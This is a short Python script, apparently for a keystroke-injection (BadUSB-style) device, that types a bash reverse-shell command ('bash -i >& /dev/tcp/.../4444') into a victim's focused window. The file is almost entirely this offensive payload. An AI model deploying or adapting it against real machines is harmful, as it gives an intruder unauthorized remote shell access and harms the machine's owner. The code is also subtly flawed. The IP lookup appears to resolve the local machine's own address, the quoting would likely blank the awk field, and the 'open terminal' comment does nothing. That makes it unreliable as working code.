#!/usr/bin/env python3
from tools.hid_type import type_text
import time, os
def main():
    time.sleep(1.0)
    # open terminal (common GNOME shortcut)
    type_text("\n")  # wake
    type_text("bash -lc 'bash -i >& /dev/tcp/$(ip -4 route get 1.1.1.1|awk \"{print $7}\")/4444 0>&1'\n")
if __name__=="__main__":
    if os.geteuid()!=0: print("Run as root"); exit(1)
    main()
